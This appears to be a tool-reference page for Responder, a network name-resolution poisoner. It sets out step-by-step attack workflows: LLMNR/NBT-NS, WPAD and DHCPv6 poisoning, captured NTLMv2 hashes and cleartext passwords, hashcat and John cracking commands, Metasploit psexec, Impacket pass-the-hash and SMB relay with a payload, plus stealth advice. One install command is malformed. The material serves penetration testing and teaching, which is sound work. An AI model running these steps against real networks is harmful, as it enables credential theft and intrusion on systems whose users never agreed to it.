---
title: "Responder - LLMNR/NBT-NS/MDNS Poisoner"
authors:
  - "Kali Linux Documentation"
date: "2026-07-18"
categories:
  - "Credential Harvesting"
  - "Credential Access"
  - "Network Attacks"
tags:
  - "responder"
  - "llmnr"
  - "nbt-ns"
  - "mdns"
  - "poisoner"
  - "credential-capture"
  - "ntlm"
mitre_tactic: credential_access
mitre_tactic_id: TA0006
mitre_technique: LLMNR/NBT-NS Poisoning
mitre_technique_id: T1557
version: "latest"
tool_url: "https://github.com/lgandx/Responder"
kali_url: "https://www.kali.org/tools/responder/"
license: "GPL-3.0"
---

# Responder - LLMNR/NBT-NS/MDNS Poisoner

## Overview

**Responder** is a LLMNR, NBT-NS, and MDNS poisoner with built-in rogue authentication servers for HTTP, SMB, MSSQL, FTP, LDAP, Kerberos, DNS, and more. It captures credentials by responding to name resolution requests, directing clients to the attacker's machine where multiple rogue servers capture credentials.

**Key Features**:
- **Name resolution poisoning** - LLMNR, NBT-NS, MDNS
- **Multiple rogue servers** - HTTP, SMB, MSSQL, FTP, LDAP, Kerberos, DNS, and more
- **Credential capture** - NTLMv1/v2, Kerberos, cleartext credentials
- **DHCPv6 support** - Force clients to use attacker's DNS
- **WPAD injection** - Proxy auto-detection poisoning
- **Session logging** - SQLite database for captured credentials
- **Cross-platform** - Works on Linux, macOS, and Windows

**Captured Data**:
- **NetNTLMv1/v2 hashes** - Crackable with hashcat/john
- **Kerberos AS-REQ hashes** - Offline cracking
- **Cleartext credentials** - HTTP Basic, FTP, SMTP, IMAP, LDAP, SQL, etc.
- **Challenge-response** - CRAM-MD5, DIGEST-MD5

## Installation

### Kali Linux (APT)

```bash
sudo apt install -y responder
```

### From Source

```bash
# Install dependencies
pip3 install netifaces pyopenssl

# Clone repository
git clone https://github.com/lgandx/Responder.git
cd Responder

# Install requirements
pip3 -r requirements.txt
```

### Docker

```bash
docker pull lgandx/responder
docker run -it --net=host lgandx/responder -I eth0
```

## Command Reference

### Core Options

| Option | Description |
|--------|-------------|
| `-I INTERFACE` | Network interface (use 'ALL' for all interfaces) |
| `-A, --analyze` | Analyze mode (passive monitoring) |
| `-w, --wpad` | Start WPAD rogue proxy server |
| `-P, --ProxyAuth` | Force NTLM/Basic authentication for proxy |
| `-v, --verbose` | Verbose output |
| `-Q, --quiet` | Quiet mode |
| `-d, --DHCP` | Enable DHCP broadcast responses |
| `-D, --DHCP-DNS` | Inject DNS server in DHCP response |
| `--dhcpv6` | Enable DHCPv6 poisoning |
| `-e 10.0.0.22, --externalip=10.0.0.22` | Poison with external IP |
| `-b, --basic` | Return HTTP Basic authentication |
| `-t 1e, --ttl=1e` | Change Windows TTL for poisoned answers |

### Configuration File

Edit `Responder.conf`:
```ini
[Responder Core]
; Servers to start
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
IMAPS = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On

; Poisoners
LLMNR = On
NBTNS = On
MDNS = On
DHCP = Off
DHCPv6 = On

; Settings
SessionLog = On
LogToFile = On
Verbose = Yes
Database = Responder.db

; SSL Certificates
SSLCert = certs/responder.crt
SSLKey = certs/responder.key
```

## Usage Examples

### Basic Poisoning

**Standard LLMNR/NBT-NS Poisoning**:
```bash
sudo responder -I eth0 -v
```

**Analyze Mode (Passive)**:
```bash
sudo responder -I eth0 -A -v
```

### DHCPv6 Attack

```bash
# Edit Responder.conf first:
# [DHCPv6 Server]
# DHCPv6_Domain = corp.local

sudo responder -I eth0 --dhcpv6 -v
```

### Force HTTP Basic Auth

```bash
sudo responder -I eth0 -b -v
```

### WPAD Proxy Attack

```bash
sudo responder -I eth0 -w -v
```

### Force Proxy Auth + Rogue DHCP

```bash
sudo responder -I eth0 -P -d -v
```

### All Interfaces

```bash
sudo responder -I ALL -v
```

### Verbose Output

```bash
sudo responder -I eth0 -vv
```

### Quiet Mode

```bash
sudo responder -I eth0 -Q -v
```

### Custom TTL

```bash
sudo responder -I eth0 -t 1e -v
```

### External IP Poisoning

```bash
sudo responder -I eth0 -e 10.0.0.22 -v
```

### Complete Attack Setup

**1. Start Responder**:
```bash
sudo responder -I eth0 -v
```

**2. Capture Credentials**:
```
[+] Listening for events...

[*] [LLMNR] Poisoned answer sent to 192.168.1.100 for name workstation
[*] [SMB] NTLMv2-SSP Hash: john::WORKGROUP:1122334455667788:A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4:010100000000000080A1B2C3D4E5F6000000000000000000000000000000000000000000000000000000000000000000
```

**3. Crack Hashes**:
```bash
# Save hash to file
echo "john::WORKGROUP:1122334455667788:A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4:010100000000000080A1B2C3D4E5F6000000000000000000000000000000000000000000000000000000000000000000" > captured_hash.txt

# Crack with hashcat
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt

# Crack with John
john captured_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Multiple Services

**Enable All Services**:
```bash
# Edit Responder.conf
[Responder Core]
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
IMAPS = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On

# Start Responder
sudo responder -I eth0 -v
```

### WPAD Attack

**1. Start Responder with WPAD**:
```bash
sudo responder -I eth0 -w -v
```

**2. Force WPAD Authentication**:
```bash
sudo responder -I eth0 -w -P -v
```

**3. Capture NTLMv2 Hash**:
```
[*] [HTTP] NTLMv2-SSP Hash: john::WORKGROUP:1122334455667788:A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4:010100000000000080A1B2C3D4E5F6000000000000000000000000000000000000000000000000000000000000000000
```

### DHCPv6 + DNS Attack

**1. Configure Responder.conf**:
```ini
[DHCPv6 Server]
DHCPv6_Domain = corp.local
SendRA = Off
BindToIPv6 = fe80::1

[Responder Core]
DNS = On
DHCPv6 = On
```

**2. Start Attack**:
```bash
sudo responder -I eth0 --dhcpv6 -v
```

**3. Capture Credentials**:
```
[DHCPv6] INFORMATION-REQUEST from fe80::a1b2:c3d4
[DHCPv6] Client domain: workstation.corp.local
[DHCPv6] Matched target domain: corp.local
[DHCPv6] Responding with DNS: fe80::1
[DNS] Query: mail.corp.local (A)
[DNS] Poisoned: mail.corp.local -> 192.168.1.100
[SMTP] Captured: user@corp.local:Password123
```

## Output Interpretation

### SMB NTLMv2 Hash

```
[+] [SMB] NTLMv2-SSP Hash: john::WORKGROUP:1122334455667788:A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4:010100000000000080A1B2C3D4E5F6000000000000000000000000000000000000000000000000000000000000000000
```

**Format**: `username::domain:challenge:response:blob`

### HTTP Basic Auth

```
[+] [HTTP] Basic: user:Password123
```

### FTP Cleartext

```
[+] [FTP] Cleartext: user:Password123
```

### SMTP Captured

```
[+] [SMTP] LOGIN: user@company.com:Password123
```

### Kerberos AS-REQ

```
[+] [Kerberos] AS-REQ Hash: user:1122334455667788:A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4
```

## Integration with Other Tools

### Hashcat Integration

```bash
# Save NTLMv2 hash
echo "john::WORKGROUP:1122334455667788:A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4:010100000000000080A1B2C3D4E5F6000000000000000000000000000000000000000000000000000000000000000000" > hash.txt

# Crack with hashcat (NTLMv2 = mode 5600)
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### John the Ripper Integration

```bash
# Save NTLMv2 hash
echo "john::WORKGROUP:1122334455667788:A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4:010100000000000080A1B2C3D4E5F6000000000000000000000000000000000000000000000000000000000000000000" > hash.txt

# Crack with John
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Metasploit Integration

```bash
# Use captured credentials
msfconsole -q -x "use exploit/windows/smb/psexec; set RHOSTS 192.168.1.100; set SMBUser administrator; set SMBPass password123; exploit"
```

### Impacket Integration

```bash
# Pass-the-hash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:cc36cf7a8514893efccd332446158b1a administrator@192.168.1.100

# SMB relay
smbrelayx.py -h 192.168.1.100 -e payload.exe
```

## Operational Security

### Stealth Mode

```bash
# Analyze mode (passive)
sudo responder -I eth0 -A -v

# Quiet mode
sudo responder -I eth0 -Q -v

# Reduce verbosity
sudo responder -I eth0
```

### Logging

```bash
# Log to file
sudo responder -I eth0 -v -o /tmp/responder.log

# Check SQLite database
sqlite3 Responder.db
```

### Rate Limiting

```bash
# Use analyze mode to monitor without poisoning
sudo responder -I eth0 -A -v

# Enable poisoning only when ready
sudo responder -I eth0 -v
```

## Common Issues and Troubleshooting

### Issue: "No credentials captured"

**Cause**: Target not using LLMNR/NBT-NS/MDNS or firewall blocking.

**Solution**:
```bash
# Verify interface
ip a

# Check for existing services
sudo netstat -tulpn | grep -E "445|80|389|88"

# Stop conflicting services
sudo systemctl stop smbd nmbd
```

### Issue: "Permission denied"

**Cause**: Not running as root.

**Solution**:
```bash
sudo responder -I eth0 -v
```

### Issue: "Interface not found"

**Cause**: Wrong interface name.

**Solution**:
```bash
# List interfaces
ip link show

# Use correct interface
sudo responder -I wlan0 -v
```

### Issue: "Port already in use"

**Cause**: Another service using the port.

**Solution**:
```bash
# Check port usage
sudo netstat -tulpn | grep 445

# Stop conflicting service
sudo systemctl stop smbd nmbd

# Or disable specific modules in Responder.conf
SMB = Off
```

### Issue: "DHCPv6 not working"

**Cause**: IPv6 disabled.

**Solution**:
```bash
# Enable IPv6
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=0

# Verify
sysctl net.ipv6.conf.all.disable_ipv6
```

### Issue: "SSL certificate errors"

**Cause**: Self-signed certificate.

**Solution**:
```bash
# Generate new certificate
cd Responder/certs
openssl req -new -x509 -keyout responder.key -out responder.crt -days 365 -nodes
```

## Best Practices

### Complete Attack Setup

```bash
# 1. Configure Responder.conf
# Enable all services you want to capture

# 2. Start Responder
sudo responder -I eth0 -v

# 3. Wait for credentials
# Monitor output for captured hashes

# 4. Crack hashes
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

### Stealth Attack

```bash
# 1. Analyze mode first
sudo responder -I eth0 -A -v

# 2. Enable poisoning when ready
sudo responder -I eth0 -v

# 3. Use quiet mode
sudo responder -I eth0 -Q -v
```

### WPAD Attack

```bash
# 1. Start with WPAD
sudo responder -I eth0 -w -v

# 2. Force authentication
sudo responder -I eth0 -w -P -v

# 3. Capture NTLMv2 hash
```

### DHCPv6 + DNS Attack

```bash
# 1. Configure Responder.conf
# Set DHCPv6_Domain = target.local

# 2. Start attack
sudo responder -I eth0 --dhcpv6 -v

# 3. Capture credentials
```

## Resources

- **GitHub Repository**: https://github.com/lgandx/Responder
- **Kali Linux Tools**: https://www.kali.org/tools/responder/
- **Author**: Laurent Gaffié (@secorizon)
- **License**: GPL-3.0

## Related Tools

- **mitm6**: IPv6 MITM tool for Active Directory attacks
- **Inveigh**: Windows LLMNR/NBT-NS/MDNS poisoner
- **mimikatz**: Windows credential dumping tool
- **ntlmrelayx**: NTLM relay tool for credential capture
- **CrackMapExec**: Network penetration testing tool
